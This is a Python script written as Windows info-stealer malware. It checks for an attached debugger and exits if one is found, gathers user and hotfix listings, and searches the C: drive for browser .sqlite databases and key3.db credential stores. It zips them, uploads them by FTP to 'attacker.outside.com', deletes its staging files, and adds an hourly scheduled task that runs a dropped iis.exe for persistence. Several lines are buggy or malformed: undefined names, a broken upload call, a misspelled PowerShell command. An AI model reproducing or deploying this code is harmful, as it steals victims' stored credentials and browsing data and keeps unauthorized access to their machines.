#Use other peoples stuff....
import subprocess
import os
import sys
import ctypes
import win32com
import threading
import datetime
import time

#Declare some Variables
kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
IsDebuggerPresent = kernel32.IsDebuggerPresent

if os.environ['COMPUTERNAME'] == 'NOTAVICTIM7':
    debug =1
else:
    debug = 0

def computer_Scheduler():
    if debug == 1:
        print ("Enterping Scheduler")
    subprocess.Popen(r"schtasks /Delete /TN iis /F")
    try:
        if os.path.isfile("C:\\Windows\\System32\\iis.exe"):
            print("IIS is in its place")
        else:
            shutil.copy(iis.exe, "C:\\Windows\\system32\\iis.exe")
    except shutil.Error as e:
        pass

    time.sleep(5)

    subprocess.Popen(r'schtasks /Create /SC HOURLY /MO 1 /TN IIS /TR "cmd /k START /B C:\\Windows\\System32\\iis.exe"')

    time.sleep(5)


def ftp(archive_name):
    import ftplib
    from ftplib import FTP

    try:
        ftp = FTP('attacker.outside.com')
        ftp.login('cisco','cisco')
        ftp.storbinary('STOR %s', open(archive_name,'rb') % archive_name)
        if debug == 1:
            print("taken")
        ftp.quit()
    except:
        if debug == 1:
            print("could not ftp")
        pass

def clean_up(dir):
    import os, shutil

    for the_file in os.listdir(dir):
        file_path = os.path.join(dir, the_file)
        try:
            if os.path.isfile(file_path):
                os.unlink(file_path)
                if debug == 1:
                    print ("Erased: " , file_path)
        except Exception as e:
            if debug == 1:
                print(e)

def steal_Stuff():
    import shutil
    import fnmatch
    import zipfile

    dir = "C:\\Temp"
    zipfilepath = os.path.join(os.path.expanduser('~'),'Downloads')

    if debug == 1:
        print("zipfile is set to: ", zipfilepath)
        print("dir is set to: ", dir)
    try:
        os.stat(dir)
        if debug == 1:
            print("Dir exists...")
        clean_up(dir)
    except Exception as e:
        os.mkdir(dir)
        if debug == 1:
            print("Done Making dir")

    try:
        subprocess.Popen(r'net user >> C:\\Temp\\netuser.txt')
        subprocess.Popen(r'powreshell.exe Get-Hotfix >> C:\\Temp\\powershell.txt')

    except Exception as e:
        pass

    try:
        matches = []

        for root, dirnames, filenames in os.walk('C:\\'):
            for filename in fnmatch.filter(filenames, '*.sqlite'):
                if debug == 1:
                    print("filename %s: ", filename)
                matches.append(os.path.join(root, filename))
            for filename in fnmatch.filter(filenames, 'key3.db'):
                if debug == 1:
                    print("filename %s ", filename)
                matches.append(os.path.join(root, filename))

        if debug == 1:
            print ("Walk is done")
        for match in matches:
            print (match)
            shutil.copy2(match, dir)

        print ("Loop Match is done")
        archive_name = os.path.join(zipfilepath, 'take')
        print("Making Zip: ", archive_name)
        shutil.make_archive(archive_name, 'zip', dir)
        print("Done Making Zip")
        ftp(archive_name)
        clean_up(dir)


    except Exception as e:
        raise


def check_Debugger():
    try:
        if IsDebuggerPresent == True:
            print ("Debugger!")
            sys.exit(1)
        else:
            if debug == 1:
                print("No Debugger")
            pass
    except Exception as e:
        raise

def main():
    try:
        check_Debugger()
        steal_Stuff()
        computer_Scheduler()

    except Exception as e:
        raise
e
if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(1)
    except:
        print ("What?")
        sys.exit(0)
